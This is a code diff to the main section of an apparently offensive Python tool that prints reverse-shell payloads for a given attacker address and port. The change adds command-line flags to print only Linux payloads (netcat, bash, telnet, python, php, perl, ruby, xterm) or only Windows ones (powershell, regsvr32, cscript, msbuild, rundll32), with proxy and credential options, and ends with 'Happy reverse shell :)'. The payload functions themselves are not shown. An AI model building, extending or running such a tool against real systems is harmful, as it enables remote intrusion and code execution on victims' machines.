@@ -255,6 +255,8 @@ if __name__ == "__main__":
     parser.add_argument("-f","--file",help="Specify file to download or execute (Default file)",default="file")
     parser.add_argument("-P","--proxy",help="Specify proxy settings ie: 127.0.0.1:8888 (Default None)",default=None)
     parser.add_argument("-c","--creds",help="Specify creds for proxy ie: [domain]\\username:password",default=None)
+    parser.add_argument("-l","--linux",help="Print only linux payloads (Default false)", default=False, action='store_true')
+    parser.add_argument("-w","--windows",help="Print only windows payloads (Default false)",default=False, action='store_true')
     args = parser.parse_args()
     if (args.interface is None):
         args.interface="eth0"
@@ -265,17 +267,32 @@ if __name__ == "__main__":
             print("Interface "+args.interface+" is without an IP address")
             sys.exit(1)
     print("Address: "+ args.address + " Port:"+args.port+"\n")
-    print("\033[93m### Linux Payloads ###\033[0m")
-    netcat(args.address,args.port);bash(args.address,args.port);
-    telnet(args.address,args.port);python(args.address,args.port);
-    php(args.address,args.port);perl(args.address,args.port);
-    ruby(args.address,args.port);xterm(args.address,args.port);
-    print("\033[93m### Windows Payloads ###\033[0m")
-    powershell(args.address,args.port,args.file,args.proxy,args.creds)
-    regsvr32(args.address,args.port,args.file,args.proxy)
-    cscript(args.address,args.port,args.file,args.proxy)
-    msbuild(args.address,args.port,args.file,args.proxy)
-    rundll32(args.address,args.port,args.file,args.proxy,args.creds)
+    if (args.linux):
+        print("\033[93m### Linux Payloads ###\033[0m")
+        netcat(args.address,args.port);bash(args.address,args.port);
+        telnet(args.address,args.port);python(args.address,args.port);
+        php(args.address,args.port);perl(args.address,args.port);
+        ruby(args.address,args.port);xterm(args.address,args.port);
+    elif (args.windows):
+        print("\033[93m### Windows Payloads ###\033[0m")
+        powershell(args.address,args.port,args.file,args.proxy,args.creds)
+        regsvr32(args.address,args.port,args.file,args.proxy)
+        cscript(args.address,args.port,args.file,args.proxy)
+        msbuild(args.address,args.port,args.file,args.proxy)
+        rundll32(args.address,args.port,args.file,args.proxy,args.creds)
+    else:
+        print("\033[93m### Linux Payloads ###\033[0m")
+        netcat(args.address,args.port);bash(args.address,args.port);
+        telnet(args.address,args.port);python(args.address,args.port);
+        php(args.address,args.port);perl(args.address,args.port);
+        ruby(args.address,args.port);xterm(args.address,args.port);
+        print("\033[93m### Windows Payloads ###\033[0m")
+        powershell(args.address,args.port,args.file,args.proxy,args.creds)
+        regsvr32(args.address,args.port,args.file,args.proxy)
+        cscript(args.address,args.port,args.file,args.proxy)
+        msbuild(args.address,args.port,args.file,args.proxy)
+        rundll32(args.address,args.port,args.file,args.proxy,args.creds)
+
     print("\033[93m### Extras ###\033[0m")
     extra(args.address,args.port,args.file)
     print("\n\033[31mHappy reverse shell :)\033[0m")
